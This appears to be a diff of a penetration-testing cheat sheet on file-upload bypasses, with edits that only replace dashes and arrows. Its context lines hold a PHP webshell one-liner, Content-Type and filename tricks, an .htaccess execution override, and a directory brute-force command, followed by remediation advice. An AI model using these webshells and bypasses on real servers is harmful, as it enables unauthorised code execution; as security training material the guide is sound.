@@ -2,7 +2,7 @@
 
 ## Why It Matters
 
-If you can upload a file that executes server-side code, you get RCE. The app might block you based on file extension, MIME type, or content — you need to bypass those checks.
+If you can upload a file that executes server-side code, you get RCE. The app might block you based on file extension, MIME type, or content - you need to bypass those checks.
 
 **Goal:** Upload a webshell (PHP, ASPX, JSP) that executes when you browse to it.
 
@@ -59,7 +59,7 @@ Content-Type: image/png
 Content-Type: image/gif
 ```
 
-Intercept the upload request in Burp Repeater → change Content-Type → forward.
+Intercept the upload request in Burp Repeater -> change Content-Type -> forward.
 
 ---
 
@@ -80,7 +80,7 @@ printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php
 ## Filename Tricks
 
 ```
-# Null byte (old PHP — truncates at null)
+# Null byte (old PHP - truncates at null)
 shell.php%00.jpg
 
 # Path traversal in filename (write outside uploads dir)
@@ -95,7 +95,7 @@ shell.Php
 
 ---
 
-## If Only Images Allowed — Image With Embedded PHP
+## If Only Images Allowed - Image With Embedded PHP
 
 ```sh
 # Add PHP code to image metadata (exiftool)
@@ -112,7 +112,7 @@ mv image.jpg shell.php.jpg
 After upload you need to know the path to browse to it:
 
 ```sh
-# Check the response — often shows the path
+# Check the response - often shows the path
 # Check the page source after upload
 # Gobuster the /uploads/ directory
 gobuster dir -u http://target/uploads/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -154,7 +154,7 @@ If you can upload a `.htaccess` file, you can make the server execute your file 
 # Upload this as .htaccess
 AddType application/x-httpd-php .jpg
 
-# Now upload shell.jpg — it executes as PHP
+# Now upload shell.jpg - it executes as PHP
 # Browse to /uploads/shell.jpg?cmd=whoami
 ```
 
@@ -162,15 +162,15 @@ AddType application/x-httpd-php .jpg
 
 ## Remediation
 
-**Root cause:** The application validates files based on unreliable signals (extension, Content-Type header, magic bytes) that an attacker controls. The validation happens at the wrong layer — the check should be on what the server will DO with the file, not what the file claims to be.
+**Root cause:** The application validates files based on unreliable signals (extension, Content-Type header, magic bytes) that an attacker controls. The validation happens at the wrong layer - the check should be on what the server will DO with the file, not what the file claims to be.
 
 | Finding | Remediation |
 |---|---|
 | Server executes uploaded files | **Never store uploaded files in a web-accessible directory.** Store uploads outside the web root (e.g., `/var/uploads/` not `/var/www/html/uploads/`). Serve them back via a download script. |
-| Extension-based validation only | Extension checks are bypassable. If files must be in a web directory, configure the web server to **never execute files in the upload directory** — Apache: `php_engine off` in upload dir's `.htaccess`, or deny execution via server config. |
+| Extension-based validation only | Extension checks are bypassable. If files must be in a web directory, configure the web server to **never execute files in the upload directory** - Apache: `php_engine off` in upload dir's `.htaccess`, or deny execution via server config. |
 | `.htaccess` can be uploaded | Explicitly block `.htaccess` uploads. In Apache, set `AllowOverride None` on the uploads directory. |
 | MIME type check only | MIME type comes from the `Content-Type` header which the attacker sets. **Do not trust it.** Validate file contents server-side using a file magic library (e.g., PHP `finfo`, Python `python-magic`). |
-| Image uploads could contain PHP | For images: use a library to re-encode the image (GD / Pillow) before storing — this strips any embedded PHP from metadata or file data. |
+| Image uploads could contain PHP | For images: use a library to re-encode the image (GD / Pillow) before storing - this strips any embedded PHP from metadata or file data. |
 | No size limit on uploads | Enforce file size limits to prevent DoS. Define allowed file types via allowlist and reject everything else. |
 
 **Key point for reports:** The only reliable fix is storing uploaded files outside the web root with execution disabled. Extension/MIME/magic byte checks are all bypassable; they are defense-in-depth, not solutions.
